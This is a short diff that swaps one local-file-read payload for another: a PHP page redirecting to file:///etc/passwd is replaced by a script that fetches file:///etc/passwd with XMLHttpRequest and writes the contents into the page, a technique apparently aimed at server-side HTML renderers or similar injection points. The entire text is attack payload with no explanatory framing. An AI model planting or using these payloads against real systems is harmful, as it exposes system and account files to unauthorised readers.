@@ -1,9 +1,6 @@
-<!DOCTYPE html>
-<html>
-<body>
-<h1>System Command Output:</h1>
-<?php
-header('location:file:///etc/passwd');
-?>
-</body>
-</html>
+<script>
+ x = new XMLHttpRequest();
+ x.open("GET", "file:///etc/passwd", false);
+ x.send();
+ document.write(x.responseText);
+</script>
